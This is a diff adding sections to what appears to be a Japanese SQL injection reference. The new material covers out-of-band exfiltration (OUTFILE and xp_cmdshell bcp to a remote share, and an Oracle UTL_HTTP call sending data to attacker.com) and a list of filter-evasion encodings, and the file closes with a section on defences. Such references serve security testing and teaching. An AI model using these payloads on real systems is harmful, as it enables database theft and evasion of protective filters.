@@ -101,6 +101,61 @@ a' UNION SELECT sleep(5),2 from users where username='admin' and password like '
 時間遅延を利用して、Salt、ユーザー名、メールアドレス、パスワードをクラックしているエクスプロイトの例  
 https://www.exploit-db.com/exploits/46635
 
+## 帯域外 SQLi
+
+### ファイル出力
+
+```SQL
+-- MySQL, MariaDB
+-- secure_file_priv設定で出力ディレクトリを限定可能
+SELECT sensitive_data FROM users INTO OUTFILE '\\\\<ip>\\logs\\out.txt';
+
+-- MS SQL Server
+EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\<ip>\logs\out.txt" -c -T';
+```
+
+### HTTP
+```SQL
+-- Oracle  see UTL_FILE
+DECLARE
+  req UTL_HTTP.REQ;
+  resp UTL_HTTP.RESP;
+BEGIN
+  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
+  UTL_HTTP.GET_RESPONSE(req);
+END;
+```
+
+
+## フィルター回避
+```text
+# URLエンコード
+' OR 1=1-- -> %27%20OR%201%3D1--+
+
+# 16進エンコード
+name = 'admin' -> name = 0x61646d696e
+
+# Unicodeエンコード
+admin -> \u0061\u0064\u006d\u0069\u006e
+
+# CONCAT
+admin -> CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)
+CHAR(0x61,0x64,0x6D,0x69,0x6E)
+
+# スペースを置き換え
+SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'
+SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'
+%09 (水平タブ)、%0A (改行)、%0C (フォームフィード)、%0D (復帰)、%A0 (改行なしスペース)
+
+# キーワード回避
+SELEcT * FROM users
+SE/**/LECT * FROM/**/users
+
+# 論理演算子
+AND -> &&
+OR -> ||
+```
+
 ## セキュリティ
 
 - フレームワークの Prepared Statements を使用する
